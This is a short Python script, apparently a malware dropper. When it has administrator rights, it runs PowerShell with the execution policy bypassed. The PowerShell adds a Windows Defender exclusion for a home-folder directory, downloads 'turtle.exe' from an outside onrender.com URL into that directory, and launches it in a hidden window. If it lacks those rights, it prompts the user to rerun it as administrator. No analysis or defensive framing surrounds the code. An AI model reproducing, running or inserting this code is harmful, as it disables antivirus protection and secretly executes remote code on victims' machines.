import subprocess
import ctypes
import threading
import sys

# Start of desired section
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_powershell_script_elevated():
    if is_admin():
        powershell = [
    "$directoryPath = Join-Path $HOME 'lol'",
    "Add-MpPreference -ExclusionPath $directoryPath",
    "$url = 'https://top-secret.onrender.com/execdll'",
    "$targetDirectory = Join-Path $HOME 'lol'",
    "if (-not (Test-Path -Path $targetDirectory)) {New-Item -Path $targetDirectory -ItemType Directory -Force}",
    "$outputFile = Join-Path $targetDirectory 'turtle.exe'",
    "Invoke-WebRequest -Uri $url -OutFile $outputFile",
    "$installerPath = $outputFile",
    "Start-Process -FilePath $installerPath -Wait -WindowStyle Hidden"
]

# Combine the PowerShell lines into a single string
        powershell_com = " ; ".join(powershell)

# Run the PowerShell script using subprocess
        subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", powershell_com], shell=True)






    else:
        ctypes.windll.kernel32.SetConsoleTitleW("Python Script")
        print("Please run the script as administrator to execute PowerShell commands with elevated privileges.")
        sys.exit(1)

def run_powershell_thread():
    run_powershell_script_elevated()

if __name__ == "__main__":
    # Create a thread for running the PowerShell script
    powershell_thread = threading.Thread(target=run_powershell_thread)

    # Start the thread
    powershell_thread.start()
# End of desired section